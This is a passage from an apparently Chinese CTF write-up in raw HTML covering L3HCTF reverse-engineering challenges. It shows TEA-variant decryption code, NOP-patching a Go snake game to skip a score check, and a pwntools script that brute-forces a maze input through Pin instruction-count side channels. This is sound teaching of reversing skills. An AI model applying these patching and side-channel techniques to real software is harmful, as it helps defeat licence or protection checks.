class="built_in">hex</span>(op1_val)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(op2_val)&#125;</span> = <span class="subst">&#123;<span class="built_in">hex</span>((op1_val+op2_val)&amp;<span class="number">0xffffffff</span>)&#125;</span>&quot;</span>)  </span><br></pre></td></tr></table></figure>

<p>log取一轮加密来分析</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shl <span class="number">0x32323232</span>, <span class="number">0x3</span> <span class="operator">=</span> <span class="number">0x91919190</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xa56babcd</span>, <span class="number">0x91919190</span> <span class="operator">=</span> <span class="number">0x36fd3d5d</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x0</span>, <span class="number">0x32323232</span> <span class="operator">=</span> <span class="number">0x32323232</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x0</span>, <span class="number">0x32323232</span> <span class="operator">=</span> <span class="number">0x32323232</span></span><br><span class="line">xor <span class="number">0x32323232</span>, <span class="number">0x36fd3d5d</span> <span class="operator">=</span> <span class="number">0x4cf0f6f</span></span><br><span class="line">shr <span class="number">0x32323232</span>, <span class="number">0x4</span> <span class="operator">=</span> <span class="number">0x3232323</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xffffffff</span>, <span class="number">0x3232323</span> <span class="operator">=</span> <span class="number">0x3232322</span></span><br><span class="line">xor <span class="number">0x4cf0f6f</span>, <span class="number">0x3232322</span> <span class="operator">=</span> <span class="number">0x7ec2c4d</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x31313131</span>, <span class="number">0x7ec2c4d</span> <span class="operator">=</span> <span class="number">0x391d5d7e</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x11223344</span>, <span class="number">0x0</span> <span class="operator">=</span> <span class="number">0x11223344</span></span><br><span class="line">shl <span class="number">0x391d5d7e</span>, <span class="number">0x2</span> <span class="operator">=</span> <span class="number">0xe47575f8</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xffffffff</span>, <span class="number">0xe47575f8</span> <span class="operator">=</span> <span class="number">0xe47575f7</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x11223344</span>, <span class="number">0x391d5d7e</span> <span class="operator">=</span> <span class="number">0x4a3f90c2</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xabcdef01</span>, <span class="number">0x4a3f90c2</span> <span class="operator">=</span> <span class="number">0xf60d7fc3</span></span><br><span class="line">xor <span class="number">0xf60d7fc3</span>, <span class="number">0xe47575f7</span> <span class="operator">=</span> <span class="number">0x12780a34</span></span><br><span class="line">shr <span class="number">0x391d5d7e</span>, <span class="number">0x5</span> <span class="operator">=</span> <span class="number">0x1c8eaeb</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xa56babcd</span>, <span class="number">0x1c8eaeb</span> <span class="operator">=</span> <span class="number">0xa73496b8</span></span><br><span class="line">xor <span class="number">0x12780a34</span>, <span class="number">0xa73496b8</span> <span class="operator">=</span> <span class="number">0xb54c9c8c</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x32323232</span>, <span class="number">0xb54c9c8c</span> <span class="operator">=</span> <span class="number">0xe77ecebe</span></span><br><span class="line">sub <span class="number">0x40</span>, <span class="number">0x1</span> <span class="operator">=</span> <span class="number">0x3f</span></span><br></pre></td></tr></table></figure>

<p>可以看到三个密钥0xa56babcd、0xffffffff、0xabcdef01以及delta&#x3D;0x11223344</p>
<p>往后分析看所有轮加密完total做了什么，可以发现下一组加密8字节用的total值是上一组结束后的total值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add</span> <span class="number">0x11223344</span>, <span class="number">0x488cd100</span> <span class="operator">=</span> <span class="number">0x59af0444</span>    <span class="operator">/</span><span class="operator">/</span> 上一组total</span><br><span class="line">shl <span class="number">0x6bc23e4e</span>, <span class="number">0x2</span> <span class="operator">=</span> <span class="number">0xaf08f938</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xffffffff</span>, <span class="number">0xaf08f938</span> <span class="operator">=</span> <span class="number">0xaf08f937</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x59af0444</span>, <span class="number">0x6bc23e4e</span> <span class="operator">=</span> <span class="number">0xc5714292</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xabcdef01</span>, <span class="number">0xc5714292</span> <span class="operator">=</span> <span class="number">0x713f3193</span></span><br><span class="line">xor <span class="number">0x713f3193</span>, <span class="number">0xaf08f937</span> <span class="operator">=</span> <span class="number">0xde37c8a4</span></span><br><span class="line">shr <span class="number">0x6bc23e4e</span>, <span class="number">0x5</span> <span class="operator">=</span> <span class="number">0x35e11f2</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xa56babcd</span>, <span class="number">0x35e11f2</span> <span class="operator">=</span> <span class="number">0xa8c9bdbf</span></span><br><span class="line">xor <span class="number">0xde37c8a4</span>, <span class="number">0xa8c9bdbf</span> <span class="operator">=</span> <span class="number">0x76fe751b</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x34343434</span>, <span class="number">0x76fe751b</span> <span class="operator">=</span> <span class="number">0xab32a94f</span></span><br><span class="line">sub <span class="number">0x40</span>, <span class="number">0x1</span> <span class="operator">=</span> <span class="number">0x3f</span></span><br><span class="line">shl <span class="number">0xab32a94f</span>, <span class="number">0x3</span> <span class="operator">=</span> <span class="number">0x59954a78</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xa56babcd</span>, <span class="number">0x59954a78</span> <span class="operator">=</span> <span class="number">0xff00f645</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x59af0444</span>, <span class="number">0xab32a94f</span> <span class="operator">=</span> <span class="number">0x4e1ad93</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x0</span>, <span class="number">0x4e1ad93</span> <span class="operator">=</span> <span class="number">0x4e1ad93</span></span><br><span class="line">xor <span class="number">0x4e1ad93</span>, <span class="number">0xff00f645</span> <span class="operator">=</span> <span class="number">0xfbe15bd6</span></span><br><span class="line">shr <span class="number">0xab32a94f</span>, <span class="number">0x4</span> <span class="operator">=</span> <span class="number">0xab32a94</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0xffffffff</span>, <span class="number">0xab32a94</span> <span class="operator">=</span> <span class="number">0xab32a93</span></span><br><span class="line">xor <span class="number">0xfbe15bd6</span>, <span class="number">0xab32a93</span> <span class="operator">=</span> <span class="number">0xf1527145</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x6bc23e4e</span>, <span class="number">0xf1527145</span> <span class="operator">=</span> <span class="number">0x5d14af93</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">0x11223344</span>, <span class="number">0x59af0444</span> <span class="operator">=</span> <span class="number">0x6ad13788</span>    <span class="operator">/</span><span class="operator">/</span> 新一组total</span><br></pre></td></tr></table></figure>

<p>搞懂加密逻辑直接开逆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_encrypt</span>(<span class="params">r, v, key, delta</span>):</span><br><span class="line">    v0, v1 = c_uint32(v[<span class="number">0</span>]), c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    total = c_uint32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        v0.value += ((v1.value &lt;&lt; <span class="number">3</span>) + key[<span class="number">0</span>]) ^ (v1.value + total.value) ^ ((v1.value &gt;&gt; <span class="number">4</span>) + key[<span class="number">1</span>])</span><br><span class="line">        total.value += delta</span><br><span class="line">        v1.value += ((v0.value &lt;&lt; <span class="number">2</span>) + key[<span class="number">1</span>]) ^ (v0.value + total.value + key[<span class="number">2</span>]) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + key[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> v0.value, v1.value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt</span>(<span class="params">r, v, key, delta, <span class="built_in">id</span></span>):</span><br><span class="line">    v0, v1 = c_uint32(v[<span class="number">0</span>]), c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    total = c_uint32(delta * r * (<span class="built_in">id</span>//<span class="number">2</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        v1.value -= ((v0.value &lt;&lt; <span class="number">2</span>) + key[<span class="number">1</span>]) ^ (v0.value + total.value + key[<span class="number">2</span>]) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + key[<span class="number">0</span>])</span><br><span class="line">        total.value -= delta</span><br><span class="line">        v0.value -= ((v1.value &lt;&lt; <span class="number">3</span>) + key[<span class="number">0</span>]) ^ (v1.value + total.value) ^ ((v1.value &gt;&gt; <span class="number">4</span>) + key[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> v0.value, v1.value</span><br><span class="line"></span><br><span class="line">v = [<span class="number">2272944806</span>, <span class="number">1784017395</span>, <span class="number">2920892487</span>, <span class="number">2984657895</span>, <span class="number">2840586369</span>, <span class="number">2613617290</span>, <span class="number">3301943967</span>, <span class="number">4053798049</span>]</span><br><span class="line">k = [<span class="number">0xa56babcd</span>, <span class="number">0xffffffff</span>, <span class="number">0xabcdef01</span>]</span><br><span class="line">delta = <span class="number">0x11223344</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v), <span class="number">2</span>):</span><br><span class="line">    v[i:i+<span class="number">2</span>] = tea_decrypt(<span class="number">64</span>, v[i:i+<span class="number">2</span>], k, delta, i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, v)))</span><br><span class="line">v = <span class="string">&quot;&quot;</span>.join([<span class="built_in">int</span>.to_bytes(v[i], byteorder=<span class="string">&#x27;little&#x27;</span>, length=<span class="number">4</span>).decode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v))])</span><br><span class="line"><span class="built_in">print</span>(v)</span><br></pre></td></tr></table></figure>

<p>得到9c50d10ba864bedfb37d7efa4e110bf2</p>
<h2><span id="snake">snake</span><a href="#snake" class="header-anchor"></a></h2><p>无符号的go实现的贪吃蛇游戏，直接读逻辑十分困难，然后有反调试，无法正常进行调试</p>
<p>搜索得到原游戏项目：<a href="https://github.com/stable-online/golang_snake?tab=readme-ov-file">https://github.com/stable-online/golang_snake?tab=readme-ov-file</a></p>
<p>Git clone一份源码然后编译出snake.exe，然后尝试bindiff恢复符号表，效果并不是很好，但是可以作为一个参考的依据。</p>
<p>寻找定位到得分判断逻辑</p>
<p><img src="../images/2025-L3HCTF/5812720d-b529-4f96-aafe-7e0d8cbe1886.png" alt="img"></p>
<p>发现是得分要到100，但是尝试修改得分要求后程序会卡住，往下理逻辑找到了一个xxtea解密的实现</p>
<p><img src="../images/2025-L3HCTF/b7c5cc65-9a4c-4cb4-bd57-62043378d1d0.png" alt="img"></p>
<p>分析之间的层次关系发现分数的改变对于xxtea的密钥会产生影响，那么思路想到去寻找得分的逻辑</p>
<p>利用编译好的原游戏文件辅助定位找到了move逻辑，其中有rc4生成随机的金币位置</p>
<p><img src="../images/2025-L3HCTF/98825187-3d59-41fd-868c-d4f0302bfbfb.png" alt="img"></p>
<p>寻找到加分的逻辑</p>
<p><img src="../images/2025-L3HCTF/37f4d4a8-4137-41c3-9f7e-9e267ccf77f8.png" alt="img"></p>
<p>现在有条件限制吃到金币之后可以得分，那么我们把这个限制条件nop取消，就可以实现随时间增加自动加分</p>
<p><img src="../images/2025-L3HCTF/51398f3e-a91b-4a54-9d51-cfab38c5262b.png" alt="img"></p>
<p>nop掉这里的cmp逻辑即可，然后重新运行程序得到flag（会随机触发不稳定的反调试，多跑几次即可）</p>
<p><img src="../images/2025-L3HCTF/d816f7ca-643c-4f63-b6cb-8ed52f2484d4.png" alt="img"></p>
<p>L3HCTF{ad4d5916-9697-4219-af06-014959c2f4c9}</p>
<h2><span id="awayout2">AWayOut2</span><a href="#awayout2" class="header-anchor"></a></h2><p>ida反编译根本看不懂只在后面爆破的时候拐回来才看到有个hjkl的判断，很明显迷宫四个方向键</p>
<p>由于太难分析控制流因此我用pintool进行爆破，观察到输入结果和对应指令数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a <span class="number">419744191</span></span><br><span class="line"></span><br><span class="line">k <span class="number">419730508</span></span><br><span class="line">h <span class="number">419730512</span></span><br><span class="line">j <span class="number">419730514</span></span><br><span class="line">l <span class="number">419744180</span> <span class="meta"># x</span></span><br><span class="line"></span><br><span class="line">la <span class="number">640207084</span></span><br><span class="line">lk <span class="number">640193401</span></span><br><span class="line">ll <span class="number">640207073</span> <span class="meta"># x</span></span><br><span class="line">lj <span class="number">640193407</span></span><br><span class="line"></span><br><span class="line">lla <span class="number">860727831</span></span><br><span class="line">llk <span class="number">860714148</span></span><br><span class="line">lll <span class="number">860714144</span></span><br><span class="line">llj <span class="number">860727830</span> <span class="meta"># x</span></span><br></pre></td></tr></table></figure>

<p>可以发现输入正确的指令数会和输入不是hjkl指令数相差较小，而其他的指令数绝对值差都大于1000，因此可以逐位进行爆破，使用DFS遍历所有可能</p>
<p>由于输入后返回结果时间较长，不使用多线程爆破时间太长了，因此我写了份基本单线程脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置 ---</span></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">PIN_COMMAND = [<span class="string">&quot;./pin&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;inscount0.so&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;./AWayOut2&quot;</span>]</span><br><span class="line"><span class="comment"># 字符集顺序现在变得更重要。将常见字符放在前面可能会提高效率。</span></span><br><span class="line">CHARSET = <span class="string">&quot;&#123;hjkl&quot;</span></span><br><span class="line">FLAG_LENGTH = <span class="number">118</span></span><br><span class="line">ANOMALY_THRESHOLD = <span class="number">9000</span>  <span class="comment"># 显著差异的阈值，可以微调</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 辅助函数 (与之前相同) ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_instruction_count</span>(<span class="params">test_flag</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    运行 PIN 工具并获取给定 flag 的指令数。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(PIN_COMMAND)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;try:\n&#x27;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        p.sendline(test_flag.encode())</span><br><span class="line">        output = p.recvall(timeout=<span class="number">20</span>)</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">        lines = output.strip().splitlines()</span><br><span class="line">        <span class="keyword">if</span> lines <span class="keyword">and</span> lines[-<span class="number">1</span>].isdigit():</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(lines[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 新的主逻辑 (激进 DFS) ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_aggressive_dfs</span>(<span class="params">known_prefix=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用激进的深度优先搜索策略。</span></span><br><span class="line"><span class="string">    一旦发现一个字符比当前层级已知的最小指令数显著更低，就立即深入。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 基本情况：如果长度达到目标，说明成功了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(known_prefix) == FLAG_LENGTH:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 成功！找到完整 Flag: <span class="subst">&#123;known_prefix&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    current_pos = <span class="built_in">len</span>(known_prefix)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 正在爆破第 <span class="subst">&#123;current_pos + <span class="number">1</span>&#125;</span> 位字符 (前缀: &#x27;<span class="subst">&#123;known_prefix&#125;</span>&#x27;)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用于存储当前层级已知的最小指令数</span></span><br><span class="line">    min_count_for_this_level = <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line">    total_chars = <span class="built_in">len</span>(CHARSET)</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(CHARSET):</span><br><span class="line">        test_flag = known_prefix + char</span><br><span class="line">        progress_text = <span class="string">f&quot;    -&gt; 进度: <span class="subst">&#123;i + <span class="number">1</span>&#125;</span>/<span class="subst">&#123;total_chars&#125;</span> | 测试: &#x27;<span class="subst">&#123;test_flag&#125;</span>&#x27;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(progress_text, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">        count = get_instruction_count(test_flag)</span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line">        <span class="keyword">if</span> count == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 跳过执行失败的尝试</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            tmp = count</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 核心逻辑：检查当前字符的指令数是否比“已知最小”还要显著降低</span></span><br><span class="line">        <span class="comment"># ANOMALY_THRESHOLD 是你说的 &quot;10000左右&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(tmp - count) &gt; ANOMALY_THRESHOLD:</span><br><span class="line">            <span class="comment"># continue</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n    [*] 发现显著更优字符 &#x27;<span class="subst">&#123;char&#125;</span>&#x27;...&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [*] 立即深入 DFS 搜索 &#x27;<span class="subst">&#123;test_flag&#125;</span>&#x27;...&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 立即递归，不再测试当前层级的其他字符</span></span><br><span class="line">            <span class="keyword">if</span> solve_aggressive_dfs(test_flag):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果这条路成功了，直接返回 True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果深入后发现是死胡同，打印回溯信息并继续在当前层级搜索</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 路径 &#x27;<span class="subst">&#123;test_flag&#125;</span>&#x27; 是死胡同, 回溯到第 <span class="subst">&#123;current_pos + <span class="number">1</span>&#125;</span> 位, 继续搜索...&quot;</span>)</span><br><span class="line">                <span class="comment"># 即使是死胡同，这个 count 也是一个新的有效最小值，需要更新</span></span><br><span class="line">                min_count_for_this_level = count</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果不是显著降低，就只更新当前层级的最小指令数</span></span><br><span class="line">        <span class="keyword">elif</span> count &lt; min_count_for_this_level:</span><br><span class="line">            min_count_for_this_level = count</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果遍历完所有字符都没有找到一条成功的路径，则说明当前前缀是错误的</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[-] 在位置 <span class="subst">&#123;current_pos + <span class="number">1</span>&#125;</span> 处所有尝试均失败。回溯...&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 程序入口 ---</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始使用“激进”DFS 策略进行全长度 Flag 爆破&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 假设 &#x27;h&#x27; 仍然是正确的第一个字符</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> solve_aggressive_dfs(<span class="string">&quot;&quot;</span>):</span><br><span class="line">        <span class="comment"># 如果不确定第一个字符，使用下面这行：</span></span><br><span class="line">        <span class="comment"># if not solve_aggressive_dfs(&quot;&quot;):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 未能找到完整的 Flag。&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br></pre></td></tr></table></figure>

<p>上面的是最基础的脚本，后面多线程发现了更多bug</p>
<ul>
<li>要限制方向，不能跑反方向，比如你之前向右走了你下一步不能再向左了，中午跑的时候还没发现，下午才发现结果里不停的jkjkjk</li>
<li>timeout加得大大的，越往后越慢，出现了好几次获取指令数为-1，直接把我dfs搞乱了，跑了一下午才发现出错了，赶紧把跑出来的路径打印出来，果然出现了一些很不合理的路径如下，还好前面的都没问题不至于再从头开始跑</li>
</ul>
<p><img src="../images/2025-L3HCTF/288ea616-82c6-470a-9528-e9670fd33236.png" alt="img"></p>
<ul>
<li>threshold指令差值应该看绝对值，最开始爆破时候没发现l方向完指令数增大，导致做差出现负数，所以一直没有l方向</li>
<li>要有一个错误基准，因此设置了一个{输入，后续输入4个方向和输入{指令数进行比较，绝对值差在1000以内是可以走的方向</li>
</ul>
<p>爆破脚本如下，借助了pwntool实现了自动化爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 